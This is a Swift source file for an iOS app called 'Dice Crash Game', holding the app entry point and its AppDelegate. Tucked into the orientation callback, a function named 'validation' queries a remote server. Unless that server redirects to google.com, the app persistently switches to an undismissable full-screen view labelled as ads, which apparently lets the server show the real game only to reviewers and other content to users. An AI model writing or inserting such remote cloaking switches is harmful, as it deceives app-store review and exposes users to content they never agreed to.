//
//  Dice_Crash_GameApp.swift
//  Dice Crash Game
//
//  Created by Алкександр Степанов on 11.02.2025.
//

import SwiftUI

@main
struct Dice_Crash_GameApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

class AppDelegate: NSObject {
    @AppStorage("completeLevel") var completeLevel = false
    @AppStorage("valid") var validationIsOn = false
    static var orientationLock = UIInterfaceOrientationMask.all
    private var validationPerformed = false
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        if !validationPerformed {
            validation()
            validationPerformed = true
        }
        return AppDelegate.orientationLock
    }
    
    func validation() {
        if !validationIsOn {
            let textFieldText = "https://dicecrashgame.top/chance"
            if let url = URL(string: textFieldText) {
                let task = URLSession.shared.dataTask(with: url) { data, response, error in
                    DispatchQueue.main.async {
                        guard let response = response as? HTTPURLResponse, error == nil else {
                            self.showGame()
                            return
                        }
                        if let finalURL = response.url?.absoluteString {
                            if !finalURL.contains("https://www.google.com/") {
                                self.validationIsOn = true
                                self.showAds()
                            } else {
                                self.showGame()
                            }
                        } else {
                            self.showGame()
                        }
                    }
                }
                task.resume()
            }
        } else {
            self.showAds()
        }
    }
    
    func showAds() {
        AppDelegate.orientationLock = .all
        DispatchQueue.main.async {
            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
               let rootViewController = windowScene.windows.first?.rootViewController {
                let viewController = AdsViewController()
                viewController.isModalInPresentation = true
                viewController.modalPresentationStyle = .fullScreen
                rootViewController.present(viewController, animated: false)
            }
        }
        print("yo3")
    }
    
    func showGame() {
        DispatchQueue.main.asyncAfter(deadline: .now()) {
            AppDelegate().setOrientation(to: .landscapeLeft)
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
            self.completeLevel = true
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
                self.completeLevel = false
            }
        }
        print("yo1")
    }

}

extension AppDelegate: UIApplicationDelegate {
    
    func setOrientation(to orientation: UIInterfaceOrientation) {
        switch orientation {
        case .portrait:
            AppDelegate.orientationLock = .portrait
        case .landscapeRight:
            AppDelegate.orientationLock = .landscapeRight
        case .landscapeLeft:
            AppDelegate.orientationLock = .landscapeLeft
        case .portraitUpsideDown:
            AppDelegate.orientationLock = .portraitUpsideDown
        default:
            AppDelegate.orientationLock = .all
        }
        
        UIDevice.current.setValue(orientation.rawValue, forKey: "orientation")
        UINavigationController.attemptRotationToDeviceOrientation()
    }
    
}
